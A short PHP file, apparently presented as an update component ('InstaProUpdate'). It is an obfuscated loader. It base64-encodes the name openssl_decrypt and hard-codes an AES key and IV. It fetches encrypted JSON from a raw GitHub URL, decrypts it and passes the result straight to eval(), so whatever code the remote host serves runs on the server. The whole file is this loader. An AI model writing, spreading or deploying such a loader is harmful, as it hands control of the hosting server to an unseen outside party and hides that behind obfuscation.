<?php
function gcode($e){
$ed = base64_decode($e);
$n = base64_decode("b3BlbnNzbF9kZWNyeXB0")($ed,base64_decode("QUVTLTI1Ni1DQkM="),base64_decode("OTg3NTYzMjE1NjQ4NzUyMw=="),0,base64_decode("MjU0NTg3ODk1NjIzNTU0MQ=="));
return $n;
}
$baseobj = file_get_contents("https://raw.githubusercontent.com/RatanDeveloper/InstaProUpdate/main/base.php");
$basedata = json_decode($baseobj, true);
eval(gcode($basedata['data1'].$basedata['data2'].$basedata['data3'].$basedata['data4'].$basedata['data5']));
?>